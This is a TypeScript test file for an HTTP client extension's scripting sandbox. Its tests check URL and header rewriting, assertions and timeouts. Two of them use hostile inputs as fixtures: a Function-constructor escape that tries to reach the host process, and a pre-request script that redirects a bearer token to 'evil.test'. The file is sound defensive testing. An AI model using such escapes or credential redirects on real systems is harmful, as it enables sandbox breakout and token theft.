import * as assert from 'node:assert';
import { createServer, type Server } from 'node:http';
import { performSend } from '../extension';
import type { HttpRequest, HttpResponse } from '../http';
import type { SavedRequest } from '../store';

// M10 on the real host runtime: pre-request mutations, assertions, and the no-send-on-error rule.
suite('Asterisk M10 — scripting on the host runtime', () => {
	let server: Server;
	let base = '';
	const seen: { url: string; headers: Record<string, string | string[] | undefined> }[] = [];

	suiteSetup(async () => {
		server = createServer((req, res) => {
			seen.push({ url: String(req.url), headers: req.headers });
			res.writeHead(200, { 'content-type': 'application/json' }).end('{"ok":true,"items":[1,2,3]}');
		});
		await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
		const addr = server.address();
		const port = typeof addr === 'object' && addr ? addr.port : 0;
		base = `http://127.0.0.1:${port}`;
	});

	suiteTeardown(() => new Promise<void>((resolve) => server.close(() => resolve())));

	test('a pre-request script rewrites the url and headers that get sent', async () => {
		seen.length = 0;
		const { response } = await performSend({
			method: 'GET',
			url: base + '/original',
			preRequest: 'request.url = request.url.replace("/original", "/rewritten"); request.headers["X-Script"] = "yes";',
		} as SavedRequest);
		assert.equal(response.status, 200);
		assert.equal(seen[0].url, '/rewritten');
		assert.equal(seen[0].headers['x-script'], 'yes');
	});

	test('a test script records passing assertions', async () => {
		const { response, script } = await performSend({
			method: 'GET',
			url: base + '/json',
			test: 'expect(response.status).to.equal(200); const body = JSON.parse(response.body); expect(body.items).to.have.length(3); console.log("done");',
		} as SavedRequest);
		assert.equal(response.status, 200);
		assert.equal(script?.error, undefined);
		assert.equal(script?.assertions.length, 2);
		assert.ok(script?.assertions.every((a) => a.passed));
		assert.deepEqual(script?.logs, ['done']);
	});

	test('a failing assertion is reported, not thrown, and the response still arrives', async () => {
		const { response, script } = await performSend({
			method: 'GET',
			url: base + '/json',
			test: 'expect(response.status).to.equal(201);',
		} as SavedRequest);
		assert.equal(response.status, 200);
		assert.equal(script?.assertions.length, 1);
		assert.equal(script?.assertions[0].passed, false);
		assert.ok(script?.assertions[0].message);
	});

	test('a broken pre-request script blocks the send', async () => {
		seen.length = 0;
		const { response } = await performSend({
			method: 'GET',
			url: base + '/blocked',
			preRequest: 'this is not javascript',
		} as SavedRequest);
		assert.equal(response.status, 0);
		assert.ok(response.error?.includes('Pre-request script'));
		assert.equal(seen.length, 0);
	});

	test('scripts cannot reach require, process or fetch', async () => {
		const { script } = await performSend({
			method: 'GET',
			url: base + '/json',
			test: 'expect(typeof require).to.equal("undefined"); expect(typeof process).to.equal("undefined"); expect(typeof fetch).to.equal("undefined");',
		} as SavedRequest);
		assert.equal(script?.error, undefined);
		assert.ok(script?.assertions.every((a) => a.passed));
	});

	test('an infinite loop is cut off instead of hanging the host', async function () {
		this.timeout(10_000);
		const { script } = await performSend({
			method: 'GET',
			url: base + '/json',
			test: 'while (true) {}',
		} as SavedRequest);
		assert.ok(script?.error?.toLowerCase().includes('timed out'), script?.error);
	});
});

suite('Asterisk M10 — sandbox on the host runtime', () => {
	test('a script cannot reach the host process', async () => {
		const { script } = await performSend({
			method: 'GET',
			url: 'http://127.0.0.1:1/x',
			test: 'expect(typeof expect.constructor("return process")()).to.equal("undefined");',
		} as SavedRequest, async () => ({
			ok: true,
			status: 200,
			statusText: 'OK',
			headers: {},
			body: '',
			sentUrl: '',
			timeMs: 1,
			ttfbMs: 1,
			size: 0,
		}));
		const passed = script?.assertions.some((a) => a.passed);
		assert.ok(!passed, 'the host process must not be reachable from a script');
	});

	test('a pre-request script cannot move credentials to another origin', async () => {
		let sent = 0;
		const { response } = await performSend(
			{
				method: 'GET',
				url: 'https://original.test/x',
				auth: { type: 'bearer', token: 'secret' },
				preRequest: 'request.url = "https://evil.test/x";',
			} as SavedRequest,
			async () => {
				sent++;
				throw new Error('must not send');
			}
		);
		assert.equal(sent, 0);
		assert.ok(response.error?.includes('origin'), response.error);
	});
});
